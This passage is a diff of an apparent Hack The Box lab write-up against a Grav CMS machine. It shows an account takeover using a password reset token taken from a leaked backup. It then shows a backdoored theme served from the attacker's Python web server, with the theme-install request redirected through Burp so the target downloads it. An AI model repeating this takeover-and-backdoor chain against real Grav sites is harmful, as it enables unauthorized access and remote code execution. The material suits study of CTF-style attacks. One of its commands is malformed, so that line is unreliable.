@@ -127,10 +127,10 @@ I will request a reset of patrick's password and download the new backup file to
 the new reset token.
 <div class="writeup-image">
   <img
-    src="/htb/images/race/download.png"
+    src="/htb/images/race/patrick_reset.png"
     alt="GRAV CMS login page"
   />
-</div>
+</div> 
 <Terminal prompt="$">
 $ unzip default_site_backup--20260821152406.zip user/accounts/patrick.yaml
 Archive:  default_site_backup--20260821152406.zip
@@ -147,8 +147,57 @@ avatar: {  }
 hashed_password: $2y$10$TWyPZQDqMZJJ/0pLdWUbY.TxVKVMHP3LzfUTo3BYWFRID7uXaoXcC
 reset: '24e8e5c5096d2bab778d48168c0c3504::1787329370'
 </Terminal>
+It was difficult to find a clean password that bypasses the check I used the backup password on this 
+endpoint found /racers/admin/reset/u/patrick/24e8e5c5096d2bab778d48168c0c3504
+<div class="writeup-image">
+  <img
+    src="/htb/images/race/login.png"
+    alt="GRAV CMS login page"
+  />
+</div>
+Bingo !
+<div class="writeup-image">
+  <img
+    src="/htb/images/race/patrick_home.png"
+    alt="GRAV CMS login page"
+  />
+</div>
 We are able to install theme but unfortunately we don't have access to internet
-We go to configuration->advanced
+Under Configuration –> Advanced, there’s the option to set a proxy. I’ll fill in my IP to point at my instance of Burp Proxy:
+I’ll make sure my Burp is set to listen on all interfaces (under Proxy –> Proxy settings –> Tools –> Proxy –> Proxy listeners)
+We download the theme
+<Terminal prompt="$">
+git clone https://github.com/Sommerregen/grav-theme-aerial.git
+Cloning into 'grav-theme-aerial'...
+remote: Enumerating objects: 75, done.
+remote: Total 75 (delta 0), reused 0 (delta 0), pack-reused 75 (from 1)
+Receiving objects: 100% (75/75), 872.40 KiB | 3.39 MiB/s, done.
+Resolving deltas: 100% (19/19), done.
+</Terminal>
+I’ll open and add a simple backdoor to the top
+<div class="writeup-image">
+  <img
+    src="/htb/images/race/payload.png"
+    alt="GRAV CMS login page"
+  />
+</div>
+Then we zip the file and start the python server to install It
+<Terminal prompt="$">
+zip -r badaerial.zip grav-theme-aerial/
+python -m http.server:8001
+Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
+</Terminal>
+We install a new theme we intercept the request
+We change the location of the response to download the malicious theme
+<div class="writeup-image">
+  <img
+    src="/htb/images/race/request.png"
+    alt="GRAV CMS login page"
+  />
+</div>
+<Terminal prompt="$">
+10.129.234.209 - - [21/Aug/2026 19:55:50] "GET /badaerial.zip HTTP/1.1" 200 -
+</Terminal>
 ## Escalade de privilèges
 
 Détails de l'escalade.
